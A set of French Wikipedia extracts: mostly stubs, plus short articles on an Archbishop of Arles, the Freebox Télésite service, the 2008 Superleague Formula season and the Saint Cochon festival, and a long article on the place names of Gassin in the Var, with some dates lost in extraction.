<doc id="3217120" url="https://fr.wikipedia.org/wiki?curid=3217120" title="Confédération des syndicats professionnels">
Confédération des syndicats professionnels

Confédération des syndicats professionnels peut désigner :

</doc>
<doc id="3217122" url="https://fr.wikipedia.org/wiki?curid=3217122" title="Elifantus d'Arles">
Elifantus d'Arles

Elifantus ( ? - ?), appelé aussi "Alefantus", "Elifant", "Alfant", est archevêque d'Arles (av.788 - ap.794).
Biographie.
Bien que mentionné dans les diptyques épiscopaux, Elifantus est peu connu. Il apparaît en 788 dans les actes d'un concile de Narbonne, à l'authenticité non assurée où d’après Charles-Louis Richard, il souscrivit en tant qu"'évêque du premier siège". 
Il participe également au concile de Francfort en 794 où son différend avec son confrère de Vienne Ursion est évoqué. À la suite de ce concile l'archevêché d'Arles est éclaté en trois, les diocèses d'Embrun et d'Aix devenant indépendants.

</doc>
<doc id="3217124" url="https://fr.wikipedia.org/wiki?curid=3217124" title="Télésite">
Télésite

Télésite était une fonctionnalité de la Freebox, lancée le , permettant de naviguer sur des sites internet codés en une version dérivée du HTML 3.2, le "HTML Freebox" (déjà utilisé par Freeplayer).
Pour activer la fonctionnalité, il fallait que le micrologiciel de la Freebox soit publié après le et avoir accepté les conditions générales de vente de la Freebox.
Free a mis fin à ce service le .
Applications.
On trouve par exemple, sur les télésites, des jeux vidéo (fonctionnalité maintenant remplacée par Elixir), des informations diverses (bourse, horoscope, trafic, météo...), des chaînes de télévision, de radio, des quiz, des applications de discussion...

</doc>
<doc id="3217133" url="https://fr.wikipedia.org/wiki?curid=3217133" title="Großenzersdorf">
Großenzersdorf



</doc>
<doc id="3217141" url="https://fr.wikipedia.org/wiki?curid=3217141" title="Superleague Formula saison 2008">
Superleague Formula saison 2008

 
La saison 2008 de la Superleague Formula est la première saison de ce championnat de course automobile sur circuit qui met en concurrence des monoplaces aux couleurs des clubs de football. Elle a commencé le 30 août et s'est achevée le 23 novembre.
Résultats.
Les courses de la Superleague Formula commencent par une séance de qualification le samedi. Au début, les équipes sont divisées en deux groupes distincts, puis les quatre équipes les plus rapides de chaque groupe se retrouvent en quart de finale. Deux voitures s'affrontent sur un tour chronométré lors de chaque quart de finale et sont séparés, au moins, de 5 secondes d'écart, pour que la voiture qui se situe en deuxième position ne soit pas avantagé (aspiration sur la ). La voiture la plus rapide se qualifie pour la demi-finale, idem pour la finale. À la fin, le vainqueur de la finale se place en pole position sur la grille de départ pour la première course. Ensuite, il y aura deux courses le dimanche, avec une grille inversée pour la seconde. À chaque course, les équipes seront en concurrence pour 1 million d'euros de primes. 
Classement.
Le classement du championnat est décidé par points, qui sont attribués en fonction de la position où l'équipe termine les Grands Prix. Les points sont attribués de la façon suivante :
Contrairement à la Formule 1, le pilote n'a pas besoin de terminer, mais de commencer, pour accumuler des points. Les mêmes points sont attribués pour la course 1 et la course 2, mais la grille est inversée lors de la course 2 et les pilotes les plus lents sont avantagés puisqu'ils partent dans les premières lignes de la grille.

</doc>
<doc id="3217142" url="https://fr.wikipedia.org/wiki?curid=3217142" title="Le livre des Esprits">
Le livre des Esprits



</doc>
<doc id="3217143" url="https://fr.wikipedia.org/wiki?curid=3217143" title="Bloc national syndical (Roumanie)">
Bloc national syndical (Roumanie)



</doc>
<doc id="3217148" url="https://fr.wikipedia.org/wiki?curid=3217148" title="Organisation centrale des employés (Suède)">
Organisation centrale des employés (Suède)



</doc>
<doc id="3217159" url="https://fr.wikipedia.org/wiki?curid=3217159" title="Confédération des syndicats de fonctionnaires (Turquie)">
Confédération des syndicats de fonctionnaires (Turquie)



</doc>
<doc id="3217164" url="https://fr.wikipedia.org/wiki?curid=3217164" title="Groland Magzine">
Groland Magzine



</doc>
<doc id="3217167" url="https://fr.wikipedia.org/wiki?curid=3217167" title="Confédération des syndicats autonomes">
Confédération des syndicats autonomes

Confédération des syndicats autonomes peut désigner:

</doc>
<doc id="3217170" url="https://fr.wikipedia.org/wiki?curid=3217170" title="Alliance syndicale indépendante (Venezuela)">
Alliance syndicale indépendante (Venezuela)



</doc>
<doc id="3217172" url="https://fr.wikipedia.org/wiki?curid=3217172" title="Décompte des médailles olympiques par nations">
Décompte des médailles olympiques par nations



</doc>
<doc id="3217179" url="https://fr.wikipedia.org/wiki?curid=3217179" title="Fédération civique nationale (États-Unis)">
Fédération civique nationale (États-Unis)



</doc>
<doc id="3217196" url="https://fr.wikipedia.org/wiki?curid=3217196" title="Saint Cochon">
Saint Cochon

La saint Cochon (aussi appelée saint Boudin) est une fête traditionnelle rurale française célébrée dans plusieurs régions, dont le Morvan.
Déroulement.
Les dates et les pratiques sont variables selon les régions, mais se situent en général entre novembre et avril. Elle peut être célébrée tant à titre privé (directement dans les fermes), qu'à titre public (fête villageoise)
La saint Cochon débute toujours par l'abattage d'un porc. Ces fêtes s'organisent ensuite autour de la dégustation de charcuterie, de grattons ou de boudin.
Depuis 1993, à Besse-et-Saint-Anastaise, dans le Puy-de-Dôme, mi-janvier se déroule la Saint Cochon. Cette manifestation gastronomique permet de déguster de la charcuterie et des plats régionaux. Elle est animée par des concerts, du théâtre, une banda et une fanfare, des concours et des repas terroir.
Depuis 2006, à la mi-juillet, à Junhac se fête le porc de montagne. Traditionnellement sont dégustés le porcelet farci, le jambon braisé ainsi que des tripoux. Au cours de ces journées sont prévus des ateliers et animations pour enfants, animations musicales, expo vente de produits régionaux, tiercés et foires aux cochons

</doc>
<doc id="3217198" url="https://fr.wikipedia.org/wiki?curid=3217198" title="Rocca aldobrandeschi">
Rocca aldobrandeschi



</doc>
<doc id="3217199" url="https://fr.wikipedia.org/wiki?curid=3217199" title="Saint-Cochon">
Saint-Cochon



</doc>

<doc id="10575452" url="https://fr.wikipedia.org/wiki?curid=10575452" title="Toponymie de Gassin">
Toponymie de Gassin

La toponymie de Gassin est la description (étymologie, histoire, usage) des noms de lieux (toponymes), de voies (odonymes) et de cours d'eau (hydronymes) de cette commune provençale du département du Var. Les habitants de Gassin ont attribué au cours des temps des noms aux lieux qu’ils fréquentaient. Ils ont été inspirés par la géographie de ce territoire des Maures, les hommes qui le peuplent, leurs croyances, leur organisation sociale, les activités économiques et leur implantation dans l’espace. Suivant l’évolution de la société, de la langue parlée, des populations présentes, les toponymes ont évolué, se sont superposés, disparaissant parfois. Ils témoignent de la vie des hommes et de l’histoire du village. La toponymie de Gassin a été étudiée de manière détaillée par Élisabeth Ulrich-Sauze.
Les différents âges de dénominations des noms de lieux.
Héritages anciens.
Le territoire de la commune était habité au moins dès le néolithique. Deux toponymes à l’origine ou l’existence contestées, ceux du village même de "Gassin" et du "quartier d’Avignon", sont considérés comme pré-celtiques. Cependant, le premier est l’objet d’autres interprétations et le second, qui n’apparait qu’à une reprise, sur la carte de Cassini. 
La colonisation grecque dans la région est à l’origine du nom "Athénopolis", dont la localisation n’est pas certaine, identifiée sur la côte entre Cavalaire-sur-Mer et Sainte-Maxime et plus particulièrement dans le golfe de Saint-Tropez, dans le secteur de cette ville, possiblement sur la côte gassinoise. 
L’implantation romaine, attestée par la présence de villæ, a laissé peu de traces directes. Le village, qui apparaît en 1056 dans un cartulaire de l’abbaye de Saint-Victor de Marseille sous le nom de "Bourrian" ("castri Borriani"), disparaît dans les années qui suivent pour laisser la place à "Garcin" qui deviendra Gassin.
La plupart des toponymes connus le sont par le provençal, qui se fixent en français avec les premiers cadastres. Ils désignent des éléments géographiques auxquels peuvent être attachés des noms de personnes ou des adjectifs : sources ("Bonne Fontaine"), trous d’eau ("Gourbenet"), pâturages ("Pré Martel"), rochers ("Roucas de Casteou"), etc.
Une partie de ces noms ont été francisés et demeurent compris aujourd'hui alors que l’orthographe et le sens d’autres ont changé ("Val de Bois", qui aurait dû être traduit par "Val du Loup").
L’ère moderne.
Avec la généralisation et les progrès de la cartographie, les noms de quartiers se figent. Seuls quelques noms connus apparaissent depuis le : ceux de la Gare, le bâtiment et la fonction ont pourtant disparu depuis la fin des années 1940, ou les Torpilles. Tous deux correspondent à une ère industrielle qui a peu touché le golfe de Saint-Tropez par ailleurs, son économie traditionnelle dominée par l’agriculture se muant en industrie touristique.
L’exception est formée par les noms de rue et de quartier au village, qui subissent une profonde modification : la "place du Saint-Esprit", la "rue droite" ou la "rue du Marquat" disparaissent, remplacées par la "place de la mairie," la "rue Longue" ou la "rue Centrale".
Les voies de communications se multiplient au et avec elles les noms de rue, de quartier, de lotissements ou de parcs résidentiels. C’est le cas avec la création de lotissements et de parcs privés et des noms de peintres au "hameau de Gassin", de clubs de golf aux "résidences du Golf", d’oiseaux à "Sinopolis" ou de plantes provençales au "parc Oasis".
Les voies publiques sont l’objet à la fin du d’une dénomination officielle au village, qui se dote de plaques de rue. La construction du nouveau village par l’architecte François Spoerry est l’occasion de la création de plusieurs voies aux inspirations diverses : reprises de microtoponymes anciens ("rue de Galembert"), appellations utilitaires comme autrefois ("rue des Écoles") ou hommage à des personnalités historiques ("place Hannibal de Châteauneuf") ou moderne ("rue Marie-Louise Raymond"), toujours locales. À l’extérieur, une partie des noms de rue actuels a repris d’anciens noms de quartiers ("chemin de Longagne, chemin de Bagary, chemin de Barbarie").
Ponctuellement depuis, des noms apparaissent, avec la construction de nouveaux ensembles, comme l’"allée du Trident" en 2016 aux Marines de Gassin. Certaines places publiques oubliées jusqu’ici sont également officiellement dénommées. Ce fut le cas des trois places à l’entrée du village baptisées en 2016 du nom de trois soldats gassinois du 15e Corps morts pour la France, faisant oublier les noms utilisés (parking de la Fontaine, parking Chapelle).
Géographie.
Le relief.
Le caractère accidenté du territoire gassinois explique l’abondance d’oronymes.
L’origine discutée du nom de Gassin.
Le nom du village de Gassin est l’objet de plusieurs hypothèses.
Une supposition répandue parmi les auteurs du , parfois modernes et largement répandue aujourd’hui, est celle d’un dérivé du latin "Guardia Sinus". Le nom du village lui viendrait de son rôle de « Gardien du Golfe ».
Le toponymiste Charles Rostaing propose comme origine la plus probable les racines indo-européennes "kar" (« pierre perchée ») et "sen" (« colline », « bâti sur un rocher ») commune à plusieurs villages provençaux : La Crau, Cassis et le Carso. Cela aurait produit Garcin.
Frédéric Mistral évoque l’origine latine "Garcinum", qui a donné "Garcin, Garci", précisant que le nom est attesté comme nom de famille en Provence. Élisabeth Ulrich-Sauze, auteure d’une thèse de l’École nationale des chartes sur les toponymes des cantons de Grimaud et Saint-Tropez, penche pour un nom de famille d’origine germanique, classant Gassin dans les noms de lieux d’origine indéterminée.
La même racine, ou le nom de Garcin/Gassin, a donné plusieurs toponymes dans le golfe de Saint-Tropez : l’ancien castrum des "Garcinières", à Cogolin, "Gassine", un hameau du Plan-de-la-Tour et Gassinière, ancien nom de quartier entre Gassin et La Croix-Valmer. A Gassin, près des Moulins de Paillas, existent également les Barri de Gassin. Il s’agit du plus haut point de la commune, à 322 mètres. Un oppidum datant de l’Âge du fer existait autrefois à cet endroit. Il a été détruit pour la construction d’antennes dépendant du ministère de l’Écologie, de l’Énergie, du Développement durable et de l’Aménagement du territoire. Il s’appelle aujourd’hui le Radio Phare.
Les hauteurs.
Plusieurs toponymes ont été créés à partir de la forme du provençal "colo", colline, du latin "collis", ou avec le diminutif "coulet". Tous ont disparu à part la Colle Bertaud, dans le nord de Gassin, colline qui descend vers la mer et le Château Bertaud au nord. Le toponyme est formé avec le nom de personne devenu nom de lieu. Les autres étaient également formés avec des noms : la Colle du Loup (colline descendant vers la Bouillabaisse, avec le nom d’animal), la Colla de Lunaut (avec un nom de personne), la Collo de Sanct-Tropes (avec le nom de lieu), la Colla de la Val (avec le nom commun géographique), Colletum et le Collet des Moulieres (avec le nom de lieu) ou un qualificatif : la Colle de Mallaval (dans le quartier des Gassinières, avec le nom "Mallaval", formé de "val" et de "mal", mauvais).
Le quartier de Coste Brigade était originellement connu comme "Coste Bregade". Il désignait alors le versant de la colline allant du village à Barbeyrolles, jusqu’à la Berle Il a été repris comme nom aujourd’hui pour le chemin vicinal numéro un dit route de Coste Brigade. Le nom dérive de "costo", « côte, penchant d’une montagne, rampe » et d’un dérivé du participe passé de l’ancien provençal "albergar", « héberger, loger », connu comme nom de famille.
Les Cuguières désigne une colline à la frontière entre Gassin et Ramatuelle. Le sommet des Cuguières est les "Barri de Gassin", où s’élevait autrefois un oppidum. Il s’agit du point culminant de Gassin, à 322 mètres. Le nom serait un oronyme dérivé, comme "Cogolin", "Cuguyon" et "Cuguillat", du latin "cuculus" (capuchon) et du provençal "cuculhat" (huppé).
L’Escaled est un quartier au sud du village, près de Ramatuelle ; il a donné son nom à la route de l’Escaled. Ce nom est un diminutif dérivé de l’ancien provençal "escalo", « échelle, escalier, montée ».
Le quartier de Malleribes désigne une colline au nord de Gassin descendant vers la mer. Le nom vient de l’adjectif provençal "mau", "malo", « mauvais » avec "ribo" « côte escarpée ». Ce dernier a également donné Las Ribas, peut-être confondu avec le premier. Exposé aux vents et autrefois peu peuplé, le quartier est aujourd’hui urbanisé. La plage à l’extrémité nord du quartier a pris le même nom.
La Motte est un quartier situé dans l’ouest de Gassin et dont le nom vient de l’ancien provençal "mota", « colline, éminence, tertre ».
La montagne du Peinier se trouve aux confins de Cogolin, Gassin et La Croix-Valmer. Ce site boisé abrite quelques ruines. Le nom dérive de "pue, puey", via l’adjectif "puat", « puy, colline isolée, sommet » avec l’adjectif -"nier", « noir ». Deux autres quartiers ont porté des noms formés avec ce nom : Pueygros, nom de quartier aujourd’hui oublié, avec l’adjectif -"gros", « gros, grand », et La Puada, avec l’adjectif "puât" dans le sens de « montée, roidillon, pente ascendante ».
Dans les vallées.
Trois noms sont utilisés pour désigner les vallées.
La liste est longue des noms de lieux créés à partir de "cros", « creux », désignant souvent un fond de vallée propice à l’agriculture. Seul le Cros de Martin, quartier situé à l’ouest du village sous le cimetière, dont le nom est formé avec le nom de personne, existe toujours. Les autres sont aujourd’hui oubliés : le Cros, utilisé seul et, avec les noms d’hommes, de saints et de lieux : le Cros de Galambert, le Cros de Johan, le Cros de la Berla, le Cros de la Bonne Font, le Cros de la Moute (aujourd’hui remplacé par "Caruby" ; voir "la Motte"), le Cros de la Roguiera, lo Cros de las Loboas (voir "Val de Bois")"," Lo Cros de Mege, Le Cros de Saint-Martin, lo Cros de Sanct Sperit, lo Cros de Val Longanha, lo Cros de Villa Vielha (voir "Ville Vieille"), le Cros du Moulin de Verdagne.
Les mots provençaux "plan" et "plano", de même sens, sont à l’origine de nombreux toponymes, dont un seul a survécu : la Plaine, quartier situé au nord du village, entre la Foux, la Citadelle et Bertaud. De nombreux autres lieux-dits étaient autrefois désignés ainsi : le Plan (ou le Plan de Gassin), lo Plan de Borriam, lo Plan de l’Olme, la Plaine de Bertaud, la Plaine de Grand Devens, la Plaine de Saint-Martin, la Plaine du Mollin, la Plaine du Puis. Le pluriel : les Plaines de Billieu, les Plaines du Perussier, las Planas de la Gastoa, las Planas del Brahosc, las Planas del Molin dels Benes, et, avec le dérivé "planestèu", « plateau, terrain plat et élevé » : lo Planestial.
Le Val de Bois est toujours aujourd’hui accidenté et boisé ; il s’étend du quartier Bertaud au nord à la frontière entre Gassin, Ramatuelle et Saint-Tropez au nord-est. Son nom dérive du provençal "vau", via le latin "vallis", « vallée », accompagné d’un adjectif substantivé de "lupus", « loup ». Le toponyme a été repris pour un odonyme de la résidence de Sinopolis, l’allée du Val de Bois. Le diminutif a également donné lo Valoun de Mege, aujourd’hui inusité. Le nom Valescure désigne une petite vallée et rivière touchant aux Barri de Gassin ; il vient de "vau", accompagné de l’adjectif "-escur", « obscur, sombre ».
L’eau.
Dans un territoire bordé par la mer Méditerranée, au fond du golfe de Saint-Tropez, la présence humaine à Gassin s’est organisée en fonction de la présence de l’eau. Élément irremplaçable et positif pour les hommes, les bêtes et les cultures, l’eau peut porter une image négative, véhiculant la maladie, comme dans les anciens marais de la Foux, ou lors d’inondations soudaines. 
Cours d’eau.
Les hydronymes figurent souvent parmi les noms aux racines les plus anciennes. Cela explique que certains noms, comme celui du "Bélieu", soient inexpliqués (voir au chapitre des noms d’origine indéterminée). Les autres tirent leur nom du provençal, à une exception près (voir le chapitre « Hommes et Dieux » pour le "Bourrian" et Flore pour la "Berle").
L’exception est Avignon , nom de plage et de quartier ("canton d’Avignon"), situé sur la Carte de Cassini entre les quartiers actuels de Bertaud et Bouillabaisse. Ce serait un dérivé d’une racine pré-indo-européenne comme la ville d’Avignon : "ab-ên" suivi du suffixe "-i-ōn(e)", connu par le grec "Аὐενιὼν" (Auenion) et le latin "Avennĭo". Son existence est cependant remise en doute, car il n’apparaît que sur cette seule carte : il pourrait s’agir d’une confusion avec un nom du territoire de Grimaud, plus au nord. 
Le provençal "rial", "riau", « rivière » a donné le Real de Gassin, avec le nom de ville. Il s’agit d’un ancien nom de la "Bouillabaisse", ruisseau qui sépare Gassin de Saint-Tropez. Il apparaît sur la carte d’État-Major sous le nom de ruisseau de Gassin. Le diminutif "rialet", a donné "lo Rialet," ancien nom d’un ruisseau au sud-ouest du village. Le même a donné "rivalet", utilisé à Sinopolis pour une avenue du Rivalet. Le provençal "revou", « tournant d’eau, endroit où l’eau tourbillonne », est à l’origine du Revau, lieu-dit aujourd’hui oublié situé sur le cours du Bourrian. Le même a donné "rivalet", utilisé à Sinopolis pour une avenue du Rivalet.
Le provençal "regoun", « petit ruisseau », diminutif de "rego," « raie, sillon », a fourni deux noms. Rogon de la Valette désigne un lieu-dit et un chemin situé au nord-est du village, près de Saint-Tropez. Le nom était à l’origine "Regon des Villettes", formé avec l’ancien provençal "vileta", diminutif de "vila", « ferme, maison de campagne », dont le sens s’est perdu et transformé. Un autre nom, aujourd’hui oublié, peut en être rapproché : lo Regon del Pontilhal, formé avec le diminutif de "pont", de même sens qu’en français.
La Montée de la Rigoulette est un escalier qui relie la "rue de l’Aire" et la "place deï Barri". Son nom provient du nom autrefois donné à un petit ruisseau qui descend du côté sud-est du village vers "la Berle", du provençal "regouleto, rigouleto" « petite rigole ».
Le Chemin du Vallat est un chemin de randonnée qui, avec le "sentier des Sources", le "sentier des Restanques" et le "sentier des Bugadières", forme "les Boucles de l’Arlatane", au sud du village. Il doit son nom au provençal "vallat", « ravin », « lit d’un torrent ». Ce nom n’apparaît pas dans les documents anciens ; il s’agit d’un nom donné à la fin du , possiblement à partir d’un ruisseau existant, ces derniers étant nombreux dans ce secteur au dénivelé important. Il existe à Sinopolis une allée du Vallat.
Sources et fontaines.
De très nombreux toponymes ont été formés à partir du provençal "font", dans le sens de « fontaine », accompagnés de noms de personne, de lieu ou d’un adjectif. C’est le cas du quartier de Bonne Fontaine, à l’est du village de Gassin, dont le nom est toujours utilisé aujourd’hui, même si la source est tarie, avec l’adjectif "bona", bonne. De nombreux noms ont disparu : Font d’Angaudo, Font d’Autran, Font de Belieu, Font de Bregas, Font de Cauvet, Font de Grimaud, Font del Castel, Font del Rayol, Font de Villa Vielha, Font Rolando et Font de Casteu. 
Le nom de la Font Bressat a été construit avec le participe passé du provençal "bressa", « bercer, remuer » ; la Font de Frenon, dans le quartier des Moulières, vient du provençal "infern", peut-être pour désigner un lieu d’accès difficile. Le terme désigne également la fosse d’évacuation des moulins. La Font del Roure désignait probablement une source à proximité d’un "quercus petraea", le chêne rouvre en provençal.
Les eaux stagnantes.
Plusieurs quartiers de Gassin étaient caractérisés autrefois par leur insalubrité due aux eaux stagnantes ; dans d’autres cas, la présence permanente d’eau était plutôt favorable. Cela est à l’origine de nombreux noms de lieux toujours utilisés. 
C’est le cas de l’un des célèbres quartiers de Gassin, celui de La Foux, connu par son carrefour de La Foux. Il est situé au nord-ouest de Gassin, partagé avec Cogolin. Son nom vient du provençal "font", dont le sens a varié de « point d’eau permanent, qui ne tarit pas » à « fontaine ». C’est le premier sens qu’il faut privilégier ici. Le quartier, formé autrefois d’un bras de la Giscle, était autrefois marécageux.
A l’opposé de la commune se trouve le Gourbenet. Ce quartier s’étend à la limite avec la Croix-Valmer le long d’un petit ruisseau, "gourg" en provençal, de l’ancien provençal "gorc", « gouffre ». Le nom ancien était "en Gorc Benet", avec un nom de personne. Deux autres toponymes aujourd’hui disparus, lo Gorc de Gandolessa, et lo Gorc de l’Oleta, ont été formés à partir de "gorc", ce dernier avec le terme "ouleto", « petite marmite » à comprendre comme « petit creux de rocher ».
Longagne est un quartier au nord-ouest de Gassin. Il désignait autrefois un lieu plus bas dans la plaine, voisin de "Mourteires", au sens proche. Ce nom est d’origine provençale, "loungagno", devant être compris dans un sens plus ancien : « latrines, cloaque, lieu infect »"."
Le quartier de Moulières se trouve entre Rebois et Barbarie, à l’ouest du village. Son nom vient du provençal "mouliero", signifiant « prairie marécageuse ». Le nom du quartier de Mourteires, confondu aujourd’hui avec La Foux, vient possiblement de l’ancien français "mortier," « boue ». Il s’agirait du diminutif du provençal "mourtié", "mourteiret". A disparu également le lieu-dit Stagnum, dont le nom désignait une étendue d’eau stagnante.
Les puits.
La nécessité de pouvoir se fournir en eau a conduit, au village comme dans les plaines, à la création de nombreux puits, dont les noms dérivent du provençal "pous". Il en demeure deux sur le domaine public au village, datés du , sur les trois qui existaient au . 
Le lieu-dit du Puits, également dénommé le Bon Puits, désignait une partie du plateau à la sortie sud du village, sur le chemin de Ramatuelle. Il a été construit avec l’adjectif "bon", de même sens en provençal qu'en français. Avec l’adjectif « neuf » a été créé le nom du Puits Neuf, lieu-dit oublié et non localisé, à proximité du village. 
Il existe aujourd’hui au village la rue du Puits. Son nom, de création récente, n’apparaît pas dans les documents anciens. Elle fait suite à la "rue Longue" et conduit à la rue de la Calade. Le puits qu’il désigne se trouve à l’angle de ces deux rues. Il date du . 
Au sud-ouest du village se trouve le chemin du Puits Saint-Jean.
Le sol.
La qualité et la composition des sols sont à l’origine de noms qui rappellent les principales caractéristiques géologiques de Gassin. (Voir aussi le chapitre sur l’agriculture). 
Le caractère rocheux et pierreux du sol gassinois apparaît dans de nombreux noms. Roucas dou Castéous, quartier à l’est du village entre Minuty et Barbeyrolles, possède un nom formé du provençal "roucas", « rocher », avec "casteu", « château ». Deux autres anciens noms de lieux sont issus du provençal "roco" : La Roquo et La Roqua del Folet. Le nom de lieu, aujourd’hui inusité, Los Clapies, vient du provençal "clapier" « tas de pierres, terrain couvert de pierres ». Le nom de Lo Gres de Sanct Laurens, ancien lieu-dit du quartier de Saint-Laurent, était formé avec le provençal "gres", « terrain graveleux, pierreux », et le nom de saint. Un autre nom a existé sur la même forme : lo Gres de Sanct Martim.
Le nom de quartier de Verdagne au sud du village, pourrait être rattaché aux hydronymes. Il vient du provençal "verd", probablement pour désigner un lieu humide et verdoyant. Son nom est associé au moulin de Verdagne, quartier dont un camping a pris le nom.
Le nom de lieu Rouilloux, désignait un quartier au sud-ouest, à la frontière avec La Croix-Valmer. Il vient du provençal "rouious", « rouillé, couleur de rouille », peut-être par association aux espaces peuplés de messugues et de fougères ou à la couleur du sol.
Las Arenas, nom de lieu aujourd’hui disparu, du provençal "areno", décrivait un « lieu plein de sable », du « menu sable qui couvre les bords de la mer et des rivières ».
L’Anglade, ancien nom de lieu à l’ouest de la Foux, formé à partir du provençal "anglado", signifiait un « angle, [un] coin de terre ».
Le vaste quartier de Fumée Longue s’étend au sud-ouest, entre la Mort du Luc et Bourrian. Son nom vient du provençal "familongua" et signifie « longue faim », peut-être pour qualifier des terres inhospitalières.
La flore.
La végétation a également fourni d’abondants toponymes qui fournissent des indications sur l’état de la nature, son évolution et le rapport de l’homme à son environnement par le choix de décrire certains lieux par la présence d’espèces typiques. (Voir également le chapitre Vergers).
Les pins, si nombreux dans la région, apparaissent dans deux toponymes, dont La Pinède, quartier au nord-est de Gassin, partagé avec Ramatuelle. Le nom vient du provençal "pin", de même signification. L’arbre a été utilisé pour désigner un autre nom de quartier, lo Pim de Ricardessa, aujourd’hui disparu. (Pour le quartier de "Pin Pinon" voir le chapitre consacré à la Vigne). Il existe à Sinopolis une allée des Pins Bouans, nom peut-être formé avec l’adjectif "bouan", bon.
Un autre arbre emblématique du territoire apparaît dans un odonyme : La Rampe des Micocouliers. Ce passage en escalier au village permet de rejoindre la "rue de l’Enclos" et la "place deï Barri". Il doit son nom au micocoulier de Provence, dont plusieurs spécimens ornent la "place deï Barri".
Le vaste quartier de Bagarède, aux confins de Gassin, la Croix-Valmer et Cogolin doit son nom au provençal "baguié", « laurier », avec le suffixe "-edo" , pour former des « taillis [...] de lauriers ». Il a donné son nom à la piste de Bagueirède Nord, qui traverse la commune du nord au sud depuis Font-Mourier jusqu’au quartier de Bagueirède et à un quartier au nord-est de ce dernier : Bagueirède Haute.
Les lieux humides et leur végétation spécifique ont fourni plusieurs toponymes, dont l’un des plus répandus : La Berle. Ce nom désigne un quartier, une fontaine, une rivière et une route à l’est du village. Elle relie la plaine de Gassin au nord au village par l’est en passant par les deux hameaux devenus domaines viticoles : Minuty et Barbeyrolles. Son nom vient du provençal "berlo", « berle dressée » plante aquatique présente dans le Var. L’ancien nom de lieu aujourd’hui oublié Lo Canier est issu du provençal "cana", « canne de Provence, roseau cultivé [...] commune dans les lieux marécageux de la Provence méditerranéenne » et son dérivé "canier", « cannaie, lieu planté de cannes ». Le nom du quartier des Jonquières, au nord, près de la Foux, du provençal "jounguiera," signifie « jonchère, lieu couvert de joncs ». Le nom s’écrivait autrefois au singulier.
Trois espèces d’arbres appréciant les lieux humides ont donné leur nom à des lieux-dits, aujourd’hui inusité : Champ de l’Hormeaud, dans le secteur de Bélieu, dont le nom est issu du provençal "olme", traduit en français en orme. Lo Fraysse, au sud du village, doit son nom au provençal "fraisse", « frêne ». Avec le suffixe "-eda", il a formé un autre nom de quartier aujourd’hui inusité : la Fraysseda. Le frêne a été à l’origine du nom même de la région, longtemps connue comme le Fraxinet, aujourd’hui le Freinet, du latin "fraxinetum". Le quartier de la Vernatelle au sud-ouest, a également un nom issu du provençal. "Vernatello" signifie « petite aulnaie », dérivé du provençal "verno", « aulne ». Cet arbre a également donné son nom à un quartier aujourd’hui oublié, la Boal de la Verne et à la Chartreuse de la Verne.
Le chêne-liège, espèce très répandue aujourd’hui et toujours utilisée, n’a laissé aucune toponyme, contrairement au chêne pubescent ou chêne blanc, du provençal "roure", « rouvre ». La Rouillère, quartier à l’est, partagé avec la commune de Ramatuelle, doit son nom à "rouviero", « forêt de rouvres ». Il est toujours aujourd’hui boisé en chênes ; le nom est utilisé par le domaine viticole qui s’y est implanté. Le chêne a également donné la Font del Roure, aujourd’hui oublié.
Deux lieux ont autrefois été nommés d’après des arbres fruitiers sauvages : L’Agranasseda et Purissier, tous deux à l’ouest du village. Leur nom vient du provençal, "agrenas", « prunellier », avec le suffixe "-eda", « lieu planté de prunelliers » pour le premier, et "peirassié", « poirier sauvage », pour le second. Cet arbre, autrefois répandu dans le Freinet, a été utilisé pour désigner un autre quartier, aujourd’hui oublié : lo Pera.
Le nom de La Font de Bregas, a été formé avec "font", « source », et du dérivé du provençal "brusc" « bruyère », désignant la bruyère arborescente, avec le suffixe augmentatif "-as". L’ancien nom de lieu Bouis, aujourd’hui inusité, vient du provençal "bouis ", « buis, arbrisseau ».
Une seule fleur est à l’origine d’un toponyme, aujourd’hui oublié : Las Porraquedas, du provençal "pourraco" « asphodèle », avec le suffixe "-eda" « champ d’asphodèles ».
La faune.
Un seul animal figure parmi les toponymes anciens : le loup. Il a donné la Colle du Loup, ancien nom de quartier aujourd’hui inusité au nord-est, près de Saint-Tropez. Le nom vient du provençal "loubo," « louve », ou peut-être dans le sens « crête de montagne dentelée ». Le Val de Bois possède la même origine, tout comme Les Louboues, quartier au nom oublié aujourd’hui, aux confins de Gassin, près de Ramatuelle et de Saint-Tropez. 
Le climat.
Gassin possède trois anémonymes, dont deux se trouvent au village.
La Montée Ven Terraou est une route à l’entrée du village, menant du cimetière à la place Neuve. Son nom vient du provençal "ven", « vent » et "terrau", « terre ». "Ven terraou" signifie littéralement « vent de terre » ; il s’agit du vent soufflant du nord-ouest à Gassin, à savoir le Mistral. Il s’oppose au vent marin, qui souffle lui, à Gassin, d’à peu près tous les autres côtés. "Vènt-terrau" était usité autrefois depuis le Forez jusqu’à l’embouchure du Rhône et au-delà.
La Traverse du Levant , au nouveau village, doit son nom au vent d’est très humide qui souffle sur les côtes de Provence.
L’allée du Ponant est une voie située à Sinopolis qui se réfère à un vent qui souffle de façon plus marquée de l’ouest que le Mistral.
Hommes et Dieux.
Les anthroponymes abondent. Ils sont proposés comme origine, outre "Gassin" (selon l’hypothèse d’Élisabeth Sauze), pour le "Bourrian", premier nom d’habitat connu du village et de l’important quartier "Bertaud", coseigneurie de Gassin au Moyen Âge.
Bourrian.
Le lieu d’implantation d’Athénopolis étant indéterminé et les noms des installations romaines n’étant pas connus, Bourrian est le nom du premier village attesté ayant existé sur le territoire de Gassin. Le lieu d’établissement exact de cet habitat est incertain. Il pourrait être identifié avec le "quartier de Villevieille" ou pourrait être l’ancien nom de Gassin.
Il est connu par le cartulaire de l’abbaye Saint-Victor comme le "castrum Borriani" en 1056, mais n’apparaît plus dans les documents postérieurs, remplacé par Garcin pour lequel il n’y avait jusqu’ici pas de mention en tant que lieu d’habitation.
Le nom demeure aujourd’hui présent dans la rivière qui traverse la commune du sud-ouest au nord, "Le Bourrian". Il existe également un quartier du "Bourrian", une "route du Bourrian" et un domaine viticole a également pris ce nom.
Il s’agit à l’origine d’un nom de domaine gallo-romain formé autour du sobriquet "burrus", « roux ». Albert Germondy proposait au une origine grecque, "βορά", auquel il donne la définition de « pâturage ».
Bertaud.
Le quartier actuel de Bertaud a été autrefois un vaste domaine accueillant le château Bertaud, arrière-fief de la baronnie de Grimaud, dont les seigneurs étaient coseigneurs de Gassin. Il a abrité un habitat ancien puisque les restes d’une villa romaine ont été retrouvées lors de travaux sur le site actuel de l’usine des torpilles de Naval Group.
